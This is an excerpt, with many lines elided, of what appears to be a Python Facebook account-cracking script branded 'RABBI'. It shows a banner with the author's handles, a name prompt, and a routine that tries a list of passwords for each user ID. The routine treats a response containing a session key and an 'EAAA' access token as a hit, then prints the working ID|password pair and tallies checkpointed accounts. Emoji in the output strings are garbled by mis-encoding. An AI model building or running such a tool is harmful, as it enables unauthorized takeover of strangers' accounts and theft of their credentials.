...
\033[1;93m  |_____/|_| \_|_____\_____|_____/|_|  |_|\____/ 
    ...
    鈹� [鉁揮 GITHUB   : RABBI-IS-BEST         鈹�

    鈹� [鉁揮 FACEBOOK : MD.RABBI       鈹�
	...
	def email(self):
		...
		nam = input("%s [?] TYPE A NAME %s(EX:ariyan ", " RABBI): "%(Y,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s\033[0;93m[RABBI馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[RABBI-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
